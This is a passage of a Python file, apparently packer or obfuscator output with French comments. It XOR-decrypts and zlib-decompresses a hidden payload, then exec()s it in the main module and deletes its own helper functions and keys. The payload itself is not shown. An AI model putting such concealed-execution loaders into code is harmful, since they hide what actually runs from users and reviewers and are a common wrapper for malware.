    __import__('sys').exit(1)
_xoQClyOpZj6U9V = bytes([53, 111, 65, 123, 83, 242, 130, 89, 177, 74, 44, 246, 209, 183, 126, 160, 102, 174, 78])
_fkyKtkGVk4S3Q5m = bytes([224, 239, 46, 130, 226, 2, 147, 7, 117, 228, 69, 179, 214, 212, 139, 77, 61, 81, 61])

def _fxo4Xq8lQmt9a4n(_bf9jVHNv0vu0h7, _kuvhlrYiea5IcJ):
    return bytes(_bf9jVHNv0vu0h7[_idRHqe1QNlNXbS] ^ _kuvhlrYiea5IcJ[_idRHqe1QNlNXbS % len(_kuvhlrYiea5IcJ)] for _idRHqe1QNlNXbS in range(len(_bf9jVHNv0vu0h7)))

def _fdgYEHCtpdJdCvr(_thxPso8_w3nARx):
    import zlib
    return zlib.decompress(_thxPso8_w3nARx) # Un seul niveau de zlib ici pour simplifier

def _fe_O3TRVAsj5TtB():
    import sys, builtins
    # 1. Déchiffrement XOR
    _x_w4oGYMQlzuFe = _fxo4Xq8lQmt9a4n(_plo4FLMxdE0y58, _xoQClyOpZj6U9V)
    # 2. Décompression Zlib
    _dnMAFOBR93yv5v = _fdgYEHCtpdJdCvr(_x_w4oGYMQlzuFe)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dnMAFOBR93yv5v.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _npWRGuWl2Rt0KY = _main.__dict__
    _npWRGuWl2Rt0KY.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _npWRGuWl2Rt0KY)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fe_O3TRVAsj5TtB()
try:
    del _fxo4Xq8lQmt9a4n, _fdgYEHCtpdJdCvr, _fe_O3TRVAsj5TtB
    del _plo4FLMxdE0y58, _xoQClyOpZj6U9V, _fkyKtkGVk4S3Q5m
except:
    pass
